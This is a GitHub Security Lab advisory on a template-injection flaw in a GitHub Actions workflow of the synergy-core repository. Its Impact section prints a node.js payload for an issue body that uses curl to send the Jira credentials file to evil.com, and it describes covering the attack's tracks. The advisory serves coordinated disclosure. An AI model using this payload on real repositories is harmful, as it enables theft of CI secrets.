<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">December 3, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-181: Template injection in the GitHub workflows of symless synergy-core repository</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>Automatic GitHub workflows in <a href="https://github.com/symless/synergy-core">synergy-core repository</a> are vulnerable to template injection from user comments.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/symless/synergy-core">synergy-core GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p>Master branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-create-step-in-job-jira-issuesyml-workflow-is-vulnerable-to-template-injection">Issue: <code class="language-plaintext highlighter-rouge">Create</code> step in <a href="https://github.com/symless/synergy-core/blob/master/.github/workflows/job-jira-issues.yml">job-jira-issues.yml</a> workflow is vulnerable to template injection</h3>

<p><code class="language-plaintext highlighter-rouge">${{ github.event.issue.title }}</code> and <code class="language-plaintext highlighter-rouge">${{ github.event.issue.body }}</code> are used to format input values to <code class="language-plaintext highlighter-rouge">atlassian/gajira-create</code> action:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
  <span class="na">issues</span><span class="pi">:</span>
    <span class="na">types</span><span class="pi">:</span> <span class="pi">[</span> <span class="nv">opened</span> <span class="pi">]</span>
<span class="nn">...</span>
<span class="na">uses</span><span class="pi">:</span> <span class="s">atlassian/gajira-create@master</span>
<span class="na">with</span><span class="pi">:</span>
    <span class="na">summary</span><span class="pi">:</span> <span class="pi">|</span>
        <span class="s">${{ github.event.issue.title }}</span>
    <span class="na">description</span><span class="pi">:</span> <span class="pi">|</span>
        <span class="s">Opened by: ${{ github.event.issue.user.login }}</span>
        <span class="s">Link: ${{ github.event.issue.html_url }}</span>
        <span class="s">${{ github.event.issue.body }}</span>
</code></pre></div></div>

<p>However the Atlassian action has a hidden feature - it expands <code class="language-plaintext highlighter-rouge">{{}}</code> itself. This way when the issue title or body contains an expression in double curly braces it is evaluated by node.js in the <code class="language-plaintext highlighter-rouge">atlassian/gajira-create</code> action.</p>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary code execution in the context of GitHub runner. For example a user may create an issue with the title <code class="language-plaintext highlighter-rouge">It doesn't work on my machine</code> and the body</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s2">`curl -d @</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">HOME</span><span class="p">}</span><span class="s2">/.jira.d/credentials http://evil.com`</span><span class="p">)</span> <span class="p">}}</span>
</code></pre></div></div>

<p>which will exfiltrate the secret Jira API token to the attacker controlled server. To make the attack less visible an attacker may modify the body of the issue to <code class="language-plaintext highlighter-rouge">Never mind my bad.</code> and close it.</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/14/2020: Report sent to vendor</li>
  <li>10/21/2020: Issue fixed in supply chain</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-181</code> in any communication regarding this issue.</p>

   